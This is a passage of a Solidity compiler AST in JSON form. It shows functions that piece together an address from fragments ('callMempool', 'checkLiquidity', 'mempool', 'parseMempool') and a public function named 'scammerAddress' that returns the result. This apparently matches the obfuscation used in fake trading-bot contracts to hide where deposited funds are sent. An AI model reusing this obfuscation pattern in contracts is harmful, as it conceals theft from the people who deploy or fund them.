													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13670:95:0"
											},
											{
												"assignments": [
													1222
												],
												"declarations": [
													{
														"constant": false,
														"id": 1222,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13776:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1221,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13776:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1226,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1224,
															"name": "_memPoolHeight",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1192,
															"src": "13817:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1223,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "13802:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1225,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13802:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13776:56:0"
											},
											{
												"assignments": [
													1228
												],
												"declarations": [
													{
														"constant": false,
														"id": 1228,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13843:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1227,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13843:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1232,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1230,
															"name": "_memPoolDepth",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1197,
															"src": "13884:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1229,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "13869:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1231,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13869:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13843:55:0"
											},
											{
												"assignments": [
													1234
												],
												"declarations": [
													{
														"constant": false,
														"id": 1234,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "13911:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1233,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13911:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1245,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1237,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1202,
																	"src": "13956:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1238,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1211,
																	"src": "13967:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1236,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1577,
																"src": "13948:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1239,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13948:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1241,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1222,
																	"src": "13987:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1242,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1228,
																	"src": "13998:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1240,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1577,
																"src": "13979:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1243,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13979:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1235,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1577,
														"src": "13940:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1244,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13940:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13911:98:0"
											},
											{
												"assignments": [
													1247
												],
												"declarations": [
													{
														"constant": false,
														"id": 1247,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1255,
														"src": "14020:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1246,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14020:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1252,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1249,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14057:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 1250,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1234,
															"src": "14062:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1248,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1577,
														"src": "14049:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1251,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14049:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14020:55:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1253,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1247,
													"src": "14103:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1168,
												"id": 1254,
												"nodeType": "Return",
												"src": "14096:19:0"
											}
										]
									},
									"documentation": null,
									"id": 1256,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1165,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13213:2:0"
									},
									"returnParameters": {
										"id": 1168,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1167,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1256,
												"src": "13239:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1166,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "13239:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13238:15:0"
									},
									"scope": 1578,
									"src": "13193:930:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1266,
										"nodeType": "Block",
										"src": "14186:53:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1262,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1256,
																"src": "14217:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1263,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14217:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1261,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 890,
														"src": "14204:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1264,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14204:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1260,
												"id": 1265,
												"nodeType": "Return",
												"src": "14197:34:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "ab1c067d",
									"id": 1267,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "scammerAddress",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1257,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14154:2:0"
									},
									"returnParameters": {
										"id": 1260,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1259,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1267,
												"src": "14178:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1258,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "14178:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14177:9:0"
									},
									"scope": 1578,
									"src": "14131:108:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1329,
										"nodeType": "Block",
										"src": "14648:269:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1280,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1276,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1274,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14663:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1275,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1269,
															"src": "14668:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "14663:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1279,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1277,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1269,
															"src": "14673:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "39",
															"id": 1278,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14678:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "14673:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "14663:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1307,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1300,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "3130",
																"id": 1295,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14751:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1298,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1269,
																		"src": "14763:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1297,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14757:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1296,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14757:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1299,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14757:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "14751:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1306,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1303,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1269,
																		"src": "14775:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1302,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14769:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1301,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "14769:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1304,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14769:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3135",
																"id": 1305,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "14781:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "14769:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "14751:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1324,
													"nodeType": "IfStatement",
													"src": "14747:103:0",
													"trueBody": {
														"id": 1323,
														"nodeType": "Block",
														"src": "14785:65:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1320,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1318,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"hexValue": "61",
																									"id": 1314,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "14823:3:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 1313,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "14818:4:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 1312,
																									"name": "byte",
																									"nodeType": "ElementaryTypeName",
																									"src": "14818:4:0",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 1315,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "14818:9:0",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 1311,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14812:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 1310,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "14812:5:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1316,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14812:16:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1317,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1269,
																					"src": "14831:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "14812:20:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3130",
																				"id": 1319,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "14835:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "14812:25:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1309,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "14807:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1308,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "14807:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1321,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14807:31:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 1273,
																"id": 1322,
																"nodeType": "Return",
																"src": "14800:38:0"
															}
														]
													}
												},
												"id": 1325,
												"nodeType": "IfStatement",
												"src": "14659:191:0",
												"trueBody": {
													"id": 1294,
													"nodeType": "Block",
													"src": "14681:60:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1291,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1287,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "14719:3:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
